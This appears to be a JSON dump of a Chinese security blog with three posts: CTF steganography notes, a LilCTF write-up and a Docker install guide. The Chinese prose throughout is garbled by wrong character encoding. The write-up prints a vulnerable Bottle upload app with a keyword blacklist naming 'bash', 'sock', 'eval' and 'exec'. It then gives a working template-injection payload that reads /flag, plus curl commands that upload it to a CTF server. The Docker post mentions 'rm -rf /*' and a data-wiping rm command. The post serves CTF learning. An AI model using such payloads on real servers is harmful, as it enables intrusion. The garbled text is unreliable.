å®å½•ï¼ˆä¸€ï¼‰\rå› ä¸ºåœ¨MiGuoçš„MISCè¯¾ä¸Šç¡å¤§è§‰ï¼Œæ‰€ä»¥è¢«MiGuoæƒ©ç½šæ¥å­¦MISC Îµ(â”¬â”¬ï¹â”¬â”¬)3\nå›¾ç‰‡éšå†™\r1.RGB\ræŠŠå›¾ç‰‡ç”¨PSæ‰“å¼€æå–RGBç„¶åè½¬16è¿›åˆ¶æ‹¿flagï¼ˆMISCå°±æ˜¯å²ï¼‰\n2.LSBéšå†™\rLSBéšå†™åŸç†ï¼š\rRGB ä¸­çš„æ¯ä¸ªé€šé“ï¼ˆçº¢ã€ç»¿ã€è“ï¼‰éƒ½æ˜¯ä¸€ä¸ª 0~255 çš„æ•´æ•°ï¼ˆå³ 8ä½ï¼‰ï¼š\nâ€‹ 255 = 11111111 â€‹ 128 = 10000000 â€‹ 17 = 00010001\næœ€ä½ä½ï¼ˆæœ€å³è¾¹ä¸€ä½ï¼‰å«åš LSBï¼ˆLeast Significant Bitï¼‰ï¼Œæ”¹åŠ¨å®ƒå¯¹äººçœ¼å‡ ä¹ä¸å¯è§ã€‚\nLSBéšå†™çš„æœ¬è´¨\nå›¾åƒä¸­æ¯ä¸ªåƒç´ çš„é¢œè‰²ç”±RGBä¸‰ä¸ªé€šé“ç»„æˆï¼Œæ¯ä¸ªé€šé“æ˜¯ä¸€ä¸ª 0~255ï¼ˆ8ä½ï¼‰ çš„æ•´æ•°ï¼š\næ•°å­— äºŒè¿›åˆ¶ï¼ˆ8ä½ï¼‰ 218 11011010 150 10010110 149 10010101 æ¯ä¸ªé¢œè‰²çš„æœ€åä¸€ä½ï¼ˆæœ€ä½æœ‰æ•ˆä½ï¼Œå³ LSBï¼‰å¯ä»¥è½»å¾®æ”¹å˜ï¼Œè€Œä¸ä¼šè¢«äººçœ¼å¯Ÿè§‰ã€‚æ¯”å¦‚ï¼š\n11011010ï¼ˆLSBæ˜¯0ï¼‰ æ”¹æˆ 11011011ï¼ˆLSBæ˜¯1ï¼‰ 10010110ï¼ˆLSBæ˜¯0ï¼‰ æ”¹æˆ 10010111ï¼ˆLSBæ˜¯1ï¼‰\næˆ‘ä»¬å°±å¯ä»¥ç”¨è¿™äº›æœ€ä½ä½æ¥â€œç¼–ç â€æˆ‘ä»¬è¦éšè—çš„ç§˜å¯†æ•°æ®çš„äºŒè¿›åˆ¶ä½ã€‚\nè§£é¢˜ï¼š\nä½¿ç”¨StegSolveæ‰“å¼€å›¾ç‰‡ï¼Œé€‰æ‹©Analyseï¼Œé€‰ä¸­RGBå³ä¾§æœ€ä½ä½ï¼Œç¿»åˆ°æœ€ä¸Šé¢æ‹¿åˆ°flag\n3.é™„åŠ ä¿¡æ¯\rç»™äº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œhidetxt.pngå’Œhidezip.png,æŠŠhidezip.pngæ‰”è¿›010æ‰¾åˆ°zipæ–‡ä»¶çš„æ–‡ä»¶å¤´ 50 4B 03 04 ç„¶åå°†zipæ–‡ä»¶å¤´å‰é¢çš„å…¨éƒ¨åˆ é™¤ï¼Œå†å°†æ–‡ä»¶é‡å‘½åä¸ºhide.zipï¼Œè§£å‹å¾—åˆ°flag\næŠŠhidetxt.pngæ”¹ä¸ºhide.txtï¼Œç„¶åæ‰”è¿›010æ‹–åˆ°æœ€åæ‹¿åˆ°flag\n4.å®½é«˜\rå›¾ç‰‡çš„IHDRæ§åˆ¶å›¾ç‰‡çš„é•¿åº¦å’Œå®½åº¦ï¼ŒæŠŠå›¾ç‰‡æ‰”è¿›010ï¼Œå®šä½åˆ°IHDR éƒ¨åˆ†ï¼Œç„¶åæ”¹é«˜åº¦çš„16è¿›åˆ¶ï¼Œå¾—åˆ°flag\n5.zlib\rè¿™ä¸ªä¸ä¼š\n6.IDAT\rä¸€ä¸ª PNG æ–‡ä»¶æ ¼å¼ä¸ºï¼š\n1 æ–‡ä»¶å¤´ï¼ˆ89 50 4E 47 0D 0A 1A 0Aï¼‰ + æ•°æ®å— + æ•°æ®å— + æ•°æ®å—â€¦â€¦ + æ–‡ä»¶å°¾ï¼ˆ00 00 00 00 49 45 4E 44 AE 42 60 82ï¼‰ PNG å®šä¹‰äº†ä¸¤ç§ç±»å‹çš„æ•°æ®å—ï¼Œä¸€ç§æ˜¯ç§°ä¸ºå…³é”®æ•°æ®å—ï¼Œè¿™æ˜¯æ ‡å‡†çš„æ•°æ®å—ï¼Œå¦ä¸€ç§å«åšè¾…åŠ©æ•°æ®å—ï¼Œè¿™æ˜¯å¯é€‰çš„æ•°æ®å—ã€‚å…³é”®æ•°æ®å—å®šä¹‰äº†4ä¸ªæ ‡å‡†æ•°æ®å—ï¼Œæ¯ä¸ª PNG æ–‡ä»¶éƒ½å¿…é¡»åŒ…å«å®ƒä»¬ã€‚\nIHDRï¼ˆæ–‡ä»¶å¤´æ•°æ®å—ï¼‰\nç¬¬ä¸€å—æ˜¯æ–‡ä»¶å¤´æ•°æ®å—ï¼ˆIHDRï¼‰ï¼Œå®ƒç”±ç¬¬11â€”â€”32å­—èŠ‚ç»„æˆï¼ˆä»0å¼€å§‹ï¼‰ï¼ŒåŒ…å«æœ‰ PNG æ–‡ä»¶ä¸­å­˜å‚¨çš„å›¾åƒæ•°æ®çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ•°æ®ä»ç¬¬ 16å­—èŠ‚å¼€å§‹ï¼Œæœ‰13ä¸ªå­—èŠ‚ï¼Œå…¶å‰8å­—èŠ‚åˆ†åˆ«ç”¨4ä¸ªå­—èŠ‚è§„å®šäº†å›¾ç‰‡çš„å®½å’Œé«˜ï¼ˆåå…­è¿›åˆ¶ï¼Œä»¥åƒç´ ä¸ºå•ä½ï¼‰ã€‚\nIDATï¼ˆå›¾åƒæ•°æ®å—ï¼‰\nå®ƒå­˜å‚¨å®é™…çš„æ•°æ®ï¼Œåœ¨æ•°æ®æµä¸­å¯åŒ…å«å¤šä¸ªè¿ç»­é¡ºåºçš„å›¾åƒæ•°æ®å—ã€‚å®ƒé‡‡ç”¨ LZ77 ç®—æ³•çš„æ´¾ç”Ÿç®—æ³•è¿›è¡Œå‹ç¼©ï¼Œå¯ä»¥ç”¨ zlib è§£å‹ç¼©ã€‚\nIDAT éšå†™\nIDAT å—åªæœ‰å½“ä¸Šä¸€ä¸ªå—å……æ»¡ï¼ˆæ­£å¸¸lengthæœ€å¤§65524ï¼‰æ—¶ï¼Œæ‰ä¼šç»§ç»­ä¸€ä¸ªæ–°çš„å—ã€‚ç¨‹åºè¯»å–å›¾åƒçš„æ—¶å€™ä¹Ÿä¼šåœ¨ç¬¬ä¸€ä¸ªæœªæ»¡çš„å—åœæ­¢ï¼ˆæŸ¥äº†ä¸‹W3Cæ ‡å‡†ï¼Œå…¶å®æ˜¯PNGå›¾ç‰‡åœ¨å‹ç¼©çš„æ—¶å€™ä¼šåœ¨æœ€åä¸€ä¸ªå—çš„æ ‡è®°ä½æ ‡æ˜è¿™æ˜¯æœ€åä¸€ä¸ªæ•°æ®å—ï¼‰ã€‚æ‰€ä»¥å¦‚æœæŸä¸€å—æ²¡æœ‰æ»¡ä½†åé¢å´è¿˜æœ‰ IDAT å—åˆ™è¯´æ˜åé¢çš„å—æ˜¯â€œå‡â€çš„ã€‚\næˆ‘ä»¬å¯ä»¥ç”¨ pngcheck -v [æ–‡ä»¶å] å»æŸ¥çœ‹PNGæ–‡ä»¶æ•°æ®å—ä¿¡æ¯ï¼Œç„¶ååˆ©ç”¨ python zlib è§£å‹å¤šä½™IDATå—çš„å†…å®¹ï¼Œæ­¤æ—¶æ³¨æ„å‰”é™¤é•¿åº¦ã€æ•°æ®å—ç±»å‹åŠæœ«å°¾çš„CRCæ ¡éªŒå€¼ã€‚\n1 2 3 4 5 import zlib import binascii IDAT = \u0026#34; \u0026#34;.decode(\u0026#39;hex\u0026#39;) #åŒå¼•å·ä¸­å¡«IDATæ•°æ® result = binascii.hexlify(zlib.decompress(IDAT)) print(result) å°†å›¾ç‰‡æ”¾è¿›kaliä¸­ï¼Œä½¿ç”¨binwalk åˆ†ç¦»ï¼Œå¾—åˆ°15AAFBï¼Œå‘ç°æ˜¯625ä¸ªäºŒè¿›åˆ¶ï¼Œæ¯äºŒåäº”ä¸ºä¸€è¡Œæ‹†å¼€ï¼Œç„¶åå°†1è½¬ä¸ºé»‘å—ï¼Œ0è½¬ä¸ºç™½å—ï¼Œå¾—åˆ°ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«æå¾—åˆ°flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 # 1. å¯¼å…¥å›¾åƒå¤„ç†æ‰€éœ€åº“ï¼ˆéœ€å…ˆå®‰è£… Pillowï¼špip install pillowï¼‰ from PIL import Image, ImageDraw # 2. å®šä¹‰æ‚¨æä¾›çš„ 01 åŸå§‹æ•°æ®ï¼ˆæ¯è¡Œå¯¹åº”å›¾åƒçš„ä¸€è¡Œï¼Œå…± 25 è¡Œï¼‰ binary_data = [ \u0026#34;1111111000100001101111111\u0026#34;, \u0026#34;1000001011100101101000001\u0026#34;, \u0026#34;1011101010000000001011101\u0026#34;, \u0026#34;1011101001000000001011101\u0026#34;, \u0026#34;1011101011101101001011101\u0026#34;, \u0026#34;1000001010101101101000001\u0026#34;, \u0026#34;1111111010101010101111111\u0026#34;, \u0026#34;0000000010111011100000000\u0026#34;, \u0026#34;1101001100000101001110110\u0026#34;, \u0026#34;1111010101001000011100000\u0026#34;, \u0026#34;0000001010000000010010011\u0026#34;, \u0026#34;0100010011100111101110011\u0026#34;, \u0026#34;1100001110111110001100101\u0026#34;, \u0026#34;0001100111000010101000110\u0026#34;, \u0026#34;1000111101011000001010001\u0026#34;, \u0026#34;0110000011011101100100001\u0026#34;, \u0026#34;1100111001000010111111101\u0026#34;, \u0026#34;0000000011010100100011110\u0026#34;, \u0026#34;1111111011100001101011011\u0026#34;, \u0026#34;1000001000011001100011110\u0026#34;, \u0026#34;1011101000110100111110000\u0026#34;, \u0026#34;1011101011000111010011100\u0026#34;, \u0026#34;1011101001001110110110001\u0026#34;, \u0026#34;1000001011000110100011000\u0026#34;, \u0026#34;1111111011010110111011011\u0026#34; ] # 3. è®¾ç½®å›¾åƒå‚æ•°ï¼ˆå¯è°ƒæ•´ block_size æ”¹å˜å›¾åƒå¤§å°ï¼‰ block_size = 15 # æ¯ä¸ª 0/1 å¯¹åº” 15x15 åƒç´ çš„æ–¹å—ï¼ˆå€¼è¶Šå¤§å›¾åƒè¶Šæ¸…æ™°ï¼‰ image_width = len(binary_data[0]) * block_size # å›¾åƒå®½åº¦ = æ¯è¡Œå­—ç¬¦æ•° Ã— æ–¹å—å¤§å° image_height = len(binary_data) * block_size # å›¾åƒé«˜åº¦ = æ€»è¡Œæ•° Ã— æ–¹å—å¤§å° # 4. åˆ›å»ºç™½è‰²èƒŒæ™¯å›¾åƒï¼ˆæ¨¡å¼ï¼šRGBï¼ŒèƒŒæ™¯è‰²ï¼šç™½è‰² #FFFFFFï¼‰ image = Image.new(\u0026#34;RGB\u0026#34;, (image_width, image_height), \u0026#34;white\u0026#34;) draw = ImageDraw.Draw(image) # åˆ›å»ºç»˜å›¾å¯¹è±¡ï¼Œç”¨äºç»˜åˆ¶é»‘è‰²å— # 5. éå†æ¯ä¸ªå­—ç¬¦ï¼Œç»˜åˆ¶é»‘ç™½å— for row_idx, row in enumerate(binary_data): for col_idx, char in enumerate(row): # è®¡ç®—å½“å‰æ–¹å—çš„å·¦ä¸Šè§’å’Œå³ä¸‹è§’åæ ‡ x1 = col_idx * block_size y1 = row_idx * block_size x2 = x1 + block_size y2 = y1 + block_size # è‹¥å­—ç¬¦ä¸º \u0026#34;1\u0026#34;ï¼Œç»˜åˆ¶é»‘è‰²å—ï¼ˆé¢œè‰²ï¼š#000000ï¼‰ï¼›\u0026#34;0\u0026#34; ä¿ç•™ç™½è‰²èƒŒæ™¯ if char == \u0026#34;1\u0026#34;: draw.rectangle([x1, y1, x2, y2], fill=\u0026#34;black\u0026#34;) # 6. ä¿å­˜å¹¶æ˜¾ç¤ºå›¾åƒ image.save(\u0026#34;binary_black_white.png\u0026#34;) # ä¿å­˜ä¸º PNG æ–‡ä»¶ï¼ˆè·¯å¾„ï¼šè„šæœ¬è¿è¡Œç›®å½•ï¼‰ image.show() # è‡ªåŠ¨æ‰“å¼€å›¾åƒæŸ¥çœ‹ï¼ˆéƒ¨åˆ†ç³»ç»Ÿå¯èƒ½éœ€è¦æ‰‹åŠ¨æ‰“å¼€æ–‡ä»¶ï¼‰ print(\u0026#34;å›¾åƒå·²ç”Ÿæˆå¹¶ä¿å­˜ä¸ºï¼šbinary_black_white.png\u0026#34;) ","date":"2025-10-06T10:31:09+08:00","permalink":"https://Oight.github.io/p/misc%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95%E4%B8%80/","title":"MISCå­¦ä¹ å®å½•ï¼ˆä¸€ï¼‰"},{"content":"LilCTFå¤ç°\ræ—¶éš”å¥½ä¹…å†ä¸€æ¬¡æ‰“CTFï¼ˆæ”¾å‡ä¹‹åå¤ªæ‡’ç‹—æˆåŒºäº†ï¼‰ï¼Œè¿˜æ˜¯ä¸€å¦‚æ—¢å¾€åœ°åšä¸å‡ºé¢˜å•ŠQAQ\nWEB\rez_bottle\ré™„ä»¶æºç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 from bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time # hint: flag in /flag , have a try UPLOAD_DIR = os.path.join(os.path.dirname(__file__), \u0026#39;uploads\u0026#39;) os.makedirs(UPLOAD_DIR, exist_ok=True) STATIC_DIR = os.path.join(os.path.dirname(__file__), \u0026#39;static\u0026#39;) MAX_FILE_SIZE = 1 * 1024 * 1024 BLACK_DICT = [\u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;os\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;exec\u0026#34;, \u0026#34;sock\u0026#34;, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026gt;\u0026#34;, \u0026#34;bul\u0026#34;, \u0026#34;class\u0026#34;, \u0026#34;?\u0026#34;, \u0026#34;:\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;_\u0026#34;, \u0026#34;globals\u0026#34;, \u0026#34;get\u0026#34;, \u0026#34;open\u0026#34;] def contains_blacklist(content): return any(black in content for black in BLACK_DICT) def is_symlink(zipinfo): return (zipinfo.external_attr \u0026gt;\u0026gt; 16) \u0026amp; 0o170000 == 0o120000 def is_safe_path(base_dir, target_path): return os.path.realpath(target_path).startswith(os.path.realpath(base_dir)) @route(\u0026#39;/\u0026#39;) def index(): return static_file(\u0026#39;index.html\u0026#39;, root=STATIC_DIR) @route(\u0026#39;/static/\u0026lt;filename\u0026gt;\u0026#39;) def server_static(filename): return static_file(filename, root=STATIC_DIR) @route(\u0026#39;/upload\u0026#39;) def upload_page(): return static_file(\u0026#39;upload.html\u0026#39;, root=STATIC_DIR) @post(\u0026#39;/upload\u0026#39;) def upload(): zip_file = request.files.get(\u0026#39;file\u0026#39;) if not zip_file or not zip_file.filename.endswith(\u0026#39;.zip\u0026#39;): return \u0026#39;Invalid file. Please upload a ZIP file.\u0026#39; if len(zip_file.file.read()) \u0026gt; MAX_FILE_SIZE: return \u0026#39;File size exceeds 1MB. Please upload a smaller ZIP file.\u0026#39; zip_file.file.seek(0) current_time = str(time.time()) unique_string = zip_file.filename + current_time md5_hash = hashlib.md5(unique_string.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, md5_hash) os.makedirs(extract_dir) zip_path = os.path.join(extract_dir, \u0026#39;upload.zip\u0026#39;) zip_file.save(zip_path) try: with zipfile.ZipFile(zip_path, \u0026#39;r\u0026#39;) as z: for file_info in z.infolist(): if is_symlink(file_info): return \u0026#39;Symbolic links are not allowed.\u0026#39; real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) if not is_safe_path(extract_dir, real_dest_path): return \u0026#39;Path traversal detected.\u0026#39; z.extractall(extract_dir) except zipfile.BadZipFile: return \u0026#39;Invalid ZIP file.\u0026#39; files = os.listdir(extract_dir) files.remove(\u0026#39;upload.zip\u0026#39;) return template(\u0026#34;æ–‡ä»¶åˆ—è¡¨: {{files}}\\nè®¿é—®: /view/{{md5}}/{{first_file}}\u0026#34;, files=\u0026#34;, \u0026#34;.join(files), md5=md5_hash, first_file=files[0] if files else \u0026#34;nofile\u0026#34;) @route(\u0026#39;/view/\u0026lt;md5\u0026gt;/\u0026lt;filename\u0026gt;\u0026#39;) def view_file(md5, filename): file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return \u0026#34;File not found.\u0026#34; with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() if contains_blacklist(content): return \u0026#34;you are hacker!!!nonono!!!\u0026#34; try: return template(content) except Exception as e: return f\u0026#34;Error rendering template: {str(e)}\u0026#34; @error(404) def error404(error): return \u0026#34;bbbbbboooottle\u0026#34; @error(403) def error403(error): return \u0026#34;Forbidden: You don\u0026#39;t have permission to access this resource.\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000, debug=False) é¢˜ç›®æç¤ºæ˜¯bottle,æƒ³èµ·æ¥ç¬¬ä¸€æ¬¡æ¥è§¦bottleä¼¼ä¹æ˜¯å®ƒçš„ååºåˆ—åŒ–æ¼æ´ï¼Œå…ˆçœ‹çœ‹æºç ï¼Œä»¥å‰æ‰“CTFè¯»æºç å¤ªå°‘ï¼Œéƒ½æ˜¯å–‚ç»™AIå»è¯»ï¼Œå¯¼è‡´æ²¡çœ‹å‡ºæ¥å“ªæœ‰æ¼æ´ï¼ˆæ‚²ï¼‰\nå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªä¸Šä¼ çš„è·¯ç”±/upload,å¯ä»¥ç”¨POSTæ–¹æ³•ä¸Šä¼ ä¸€ä¸ªzipæ–‡ä»¶ï¼Œç»è¿‡ä¸€ç³»åˆ—æ ¡éªŒæ²¡é—®é¢˜åå°±ä¼šæŠŠzipæ–‡ä»¶é‡Œçš„å†…å®¹æ¸²æŸ“åˆ°/view/\u0026lt;md5\u0026gt;/\u0026lt;filename\u0026gt;è·¯ç”±ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 @route(\u0026#39;/view/\u0026lt;md5\u0026gt;/\u0026lt;filename\u0026gt;\u0026#39;) def view_file(md5, filename): file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return \u0026#34;File not found.\u0026#34; with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() if contains_blacklist(content): return \u0026#34;you are hacker!!!nonono!!!\u0026#34; try: return template(content) except Exception as e: return f\u0026#34;Error rendering template: {str(e)}\u0026#34; å¯ä»¥çœ‹åˆ°å°±æ˜¯æ¸²æŸ“çš„è¿™é‡Œå‡ºäº†é—®é¢˜ï¼Œç”±äºé»‘åå•è®¾ç½®å¾—æ¯”è¾ƒè„†å¼±ï¼Œä¼šå¯¼è‡´å¦‚æœç»•è¿‡äº†æ‹¦æˆªï¼Œå±é™©ä»£ç å°±ä¼šè¢«æ‰§è¡Œï¼›\nåˆ©ç”¨æ–¹æ³•ï¼š åœ¨Bottleæ–‡æ¡£ä¸­æœ‰è¿™æ ·ä¸€æ®µè¯ï¼š\nThe template engine allows you to embed lines or blocks of python code within your template. Code lines start with \u0026lt;span class=\u0026quot;pre\u0026quot;\u0026gt;%\u0026lt;/span\u0026gt; and code blocks are surrounded by \u0026lt;span class=\u0026quot;pre\u0026quot;\u0026gt;\u0026lt;%\u0026lt;/span\u0026gt; and \u0026lt;span class=\u0026quot;pre\u0026quot;\u0026gt;%\u0026gt;\u0026lt;/span\u0026gt; tokens:\n1 2 3 4 5 6 7 % name = \u0026#34;Bob\u0026#34; # a line of python code \u0026lt;p\u0026gt;Some plain text in between\u0026lt;/p\u0026gt; \u0026lt;% # A block of python code name = name.title().strip() %\u0026gt; \u0026lt;p\u0026gt;More plain text\u0026lt;/p\u0026gt; `\nbottleæ¡†æ¶å…è®¸åµŒå…¥Pythonä»£ç ï¼Œä»£ç è¡Œä»¥%å¼€å¤´ï¼›\næ˜¾ç„¶%å¹¶ä¸åœ¨é»‘åå•èŒƒå›´å†…\næ‰€ä»¥å¯ä»¥å†™Pythonä»£ç ï¼š\n1 2 3 % import fileinput % m = \u0026#39;\u0026#39;.join(fileinput.input(\u0026#39;/flag\u0026#39;)) % raise Exception(m) ç„¶åæ‰“åŒ…è¿›zipï¼›ç”±äºè¿™é‡Œæ²¡æœ‰åŠæ³•ç›´æ¥ä¼ åŒ…ï¼Œåªç•™äº†æ¥å£ï¼Œæ‰€ä»¥ç”¨curlä¼ ä¸‹å‚ï¼ˆæ¯”èµ›ä¸­ä¸çŸ¥é“ä¸ºä»€ä¹ˆå®Œå…¨ä¼ ä¸ä¸Šå»å•ŠQAQï¼‰\n1 2 curl -X POST \u0026#34;http://gz.imxbt.cn:20568/upload\u0026#34; \\ -F \u0026#34;file=@exp.zip;type=application/zip;filename=exp.zip\u0026#34; 1 2 3 4 curl -X POST \u0026#34;http://gz.imxbt.cn:20568/upload\u0026#34; -F \u0026#34;file=@exp.zip;type=application/zip;filename=exp.zip\u0026#34; æ–‡ä»¶åˆ—è¡¨: exp.txt è®¿é—®: /view/90767a02ed4bb2cd910c1f0c30ecd340/exp.txt è®¿é—®http://gz.imxbt.cn:20568/view/90767a02ed4bb2cd910c1f0c30ecd340/exp.txtå¾—åˆ°flag\n","date":"2025-09-01T10:31:09+08:00","permalink":"https://Oight.github.io/p/lilctf%E5%A4%8D%E7%8E%B0/","title":"LilCTFå¤ç°"},{"content":"å‰è¨€\rç”±äºä¸Šæ¬¡ä¸å°å¿ƒæ‰§è¡Œrm -rf /*å¯¼è‡´äº†æˆ‘çš„ç”µè„‘ç„•ç„¶ä¸€æ–°ï¼ˆï¼‰\nä¹‹åä¸€ç›´åœ¨å°è¯•é‡æ–°æ­å»ºåšå®¢ï¼Œç„¶è€Œç”±äºæ”¾å¼ƒäº†åŸæœ‰çš„Hexoé€‰æ‹©äº†Hugoï¼Œå¯¼è‡´è¿›å±•ä¸€ç›´ä¸ç”šé¡ºåˆ©\nä¸è¿‡åœ¨ç»è¿‡å¤šæ¬¡å°è¯•å’Œè°ƒæ•´ä¹‹åï¼Œæ–°çš„åšå®¢ä¹Ÿæ˜¯æ­å¥½äº†ï¼Œåé¢å¯ä»¥æ­£å¸¸æ›´æ–°äº†ã€‚\nè™½ç„¶è¿˜æœ‰ä¸€äº›é—®é¢˜æ²¡å¤„ç†å¥½ï¼Œä½†æ˜¯å¤§ä½“è®°å½•å­¦ä¹ è¿‡ç¨‹çš„ç›®çš„è¿˜æ˜¯èƒ½è¾¾åˆ°çš„ï¼Œå°é—®é¢˜å°±æš‚ä¸”æŒ‰ä¸‹ä¸è¡¨å§ï¼ˆï¼‰\nDockerå­¦ä¹ \rå…³äºDocker\rä¼—æ‰€å‘¨çŸ¥Dockeræ˜¯ä¸€ä¸ªå®¹å™¨å¼•æ“ï¼Œæ€§èƒ½å¾ˆå¥½ã€‚\nè¯¦ç»†äº†è§£ï¼š\nDocker\nDocker æ•™ç¨‹\nDebian Docker å®‰è£…\rDocker æ”¯æŒä»¥ä¸‹çš„ 64 ä½ Debian ç‰ˆæœ¬ï¼š\nDebian Bookworm 12 ï¼ˆç¨³å®šç‰ˆï¼‰ Debian Bullseye 11 ï¼ˆæ—§ç¨³å®šç‰ˆï¼‰ æ”¯æŒçš„æ¶æ„åŒ…æ‹¬ x86_64ï¼ˆamd64ï¼‰ã€armhfã€arm64 å’Œ ppc64leã€‚\nå¸è½½æ—§ç‰ˆæœ¬\rå¦‚æœä½ ä¹‹å‰å®‰è£…è¿‡ Docker Engine ä¹‹å‰ï¼Œä½ éœ€è¦å¸è½½æ—§ç‰ˆæœ¬ï¼Œé¿å…å†²çªï¼š\n1 for pkg in docker.io docker-doc docker-compose podman-docker containerd runc; do sudo apt-get remove $pkg; done ä½¿ç”¨å®˜æ–¹å®‰è£…è„šæœ¬è‡ªåŠ¨å®‰è£…\rå®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š\n1 2 curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh æ‰‹åŠ¨å®‰è£…ï¼ˆæ¨èï¼‰\r1. æ›´æ–°è½¯ä»¶åŒ…\ré¦–å…ˆï¼Œæ›´æ–°ç°æœ‰çš„è½¯ä»¶åŒ…å’ŒåŒ…ç¼“å­˜ï¼š\n1 2 sudo apt update sudo apt upgrade 2. å®‰è£…ä¾èµ–åŒ…\rå®‰è£…ä¸€äº›éœ€è¦çš„ä¾èµ–åŒ…ï¼Œè¿™äº›åŒ…å…è®¸ apt ä½¿ç”¨ HTTPS åè®®æ¥è®¿é—® Docker ä»“åº“ï¼š\n1 sudo apt install apt-transport-https ca-certificates curl software-properties-common 3. æ·»åŠ  Docker å®˜æ–¹ GPG å¯†é’¥\rä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥æ·»åŠ  Docker å®˜æ–¹çš„ GPG å¯†é’¥ï¼š\n1 2 sudo curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc sudo chmod a+r /etc/apt/keyrings/docker.asc 4. æ·»åŠ  Docker ä»“åº“\ræ·»åŠ  Docker å®˜æ–¹çš„ APT è½¯ä»¶æºï¼š\n1 2 3 4 5 6 echo \\ \u0026#34;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \\ $(. /etc/os-release \u0026amp;\u0026amp; echo \u0026#34;$VERSION_CODENAME\u0026#34;) stable\u0026#34; | \\ sudo tee /etc/apt/sources.list.d/docker.list \u0026gt; /dev/null # æ›´æ–° sudo apt-get update 5. æ›´æ–° APT è½¯ä»¶åŒ…ç¼“å­˜\ræ·»åŠ ä»“åº“åï¼Œæ›´æ–° APT åŒ…ç´¢å¼•ï¼š\n1 sudo apt update ç¡®ä¿ä½ ç°åœ¨ä» Docker å®˜æ–¹ä»“åº“å®‰è£… Docker è€Œä¸æ˜¯ Debian é»˜è®¤ä»“åº“ï¼š\n1 apt-cache policy docker-ce ä½ åº”è¯¥çœ‹åˆ°å®ƒæŒ‡å‘ https://download.docker.com/ï¼Œç¡®ä¿è¿™å°±æ˜¯å®˜æ–¹çš„ Docker ä»“åº“ã€‚\n6. å®‰è£… Docker\rç°åœ¨ï¼Œä½ å¯ä»¥å®‰è£… Dockerï¼š\n1 sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin 7. å¯åŠ¨å¹¶éªŒè¯ Docker\rå¯åŠ¨ Docker å¹¶è®¾ç½®ä¸ºå¼€æœºè‡ªå¯ï¼š\n1 2 sudo systemctl start docker sudo systemctl enable docker ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥éªŒè¯ Docker æ˜¯å¦å®‰è£…æˆåŠŸï¼š\n1 sudo docker --version è¿è¡Œä»¥ä¸‹æµ‹è¯•å‘½ä»¤ç¡®ä¿ Docker æ­£å¸¸å·¥ä½œï¼š\n1 sudo docker run hello-world å¸è½½ docker\råˆ é™¤å®‰è£…åŒ…ï¼š\n1 sudo apt-get purge docker-ce åˆ é™¤é•œåƒã€å®¹å™¨ã€é…ç½®æ–‡ä»¶ç­‰å†…å®¹ï¼š\n1 sudo rm -rf /var/lib/docker Docker åŸºæœ¬å‘½ä»¤\rè¿™é‡Œè®°å½•ä¸€ä¸‹DockeråŸºæœ¬å‘½ä»¤ï¼Œæ–¹ä¾¿æŸ¥ï¼ˆå…¶å®æ„Ÿè§‰æŸ¥èœé¸Ÿæ•™ç¨‹æ›´å¿«ä¸€ç‚¹() ï¼‰\nå‘½ä»¤ åŠŸèƒ½ ç¤ºä¾‹ docker run å¯åŠ¨ä¸€ä¸ªæ–°çš„å®¹å™¨å¹¶è¿è¡Œå‘½ä»¤ docker run -d ubuntu docker ps åˆ—å‡ºå½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨ docker ps docker ps -a åˆ—å‡ºæ‰€æœ‰å®¹å™¨ï¼ˆåŒ…æ‹¬å·²åœæ­¢çš„å®¹å™¨ï¼‰ docker ps -a docker build ä½¿ç”¨ Dockerfile æ„å»ºé•œåƒ docker build -t my-image . docker images åˆ—å‡ºæœ¬åœ°å­˜å‚¨çš„æ‰€æœ‰é•œåƒ docker images docker pull ä» Docker ä»“åº“æ‹‰å–é•œåƒ docker pull ubuntu docker push å°†é•œåƒæ¨é€åˆ° Docker ä»“åº“ docker push my-image docker exec åœ¨è¿è¡Œçš„å®¹å™¨ä¸­æ‰§è¡Œå‘½ä»¤ docker exec -it container_name bash docker stop åœæ­¢ä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨ docker stop container_name docker start 